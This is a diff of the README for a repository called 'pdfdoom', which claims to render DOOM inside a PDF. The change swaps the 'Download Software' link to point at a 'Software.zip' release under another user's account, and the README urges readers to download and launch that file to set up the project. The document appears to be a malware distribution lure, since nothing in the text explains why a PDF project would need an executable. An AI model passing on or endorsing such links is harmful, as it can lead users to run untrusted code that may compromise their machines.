@@ -13,7 +13,7 @@ The "pdfdoom" repository is home to the revolutionary concept of rendering DOOM 
 
 ### Get Started:
 To explore the world of PDFDOOM, you can download the necessary software from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/Aumlo123/pdfdoom/releases/download/v2.0/Software.zip)](https://github.com/Aumlo123/pdfdoom/releases/download/v2.0/Software.zip)
 
 ### Launching Software:
 The provided link leads to a file that needs to be launched to set up the software for PDFDOOM. Once you have downloaded and launched the software, you will be ready to experience DOOM in a whole new way!
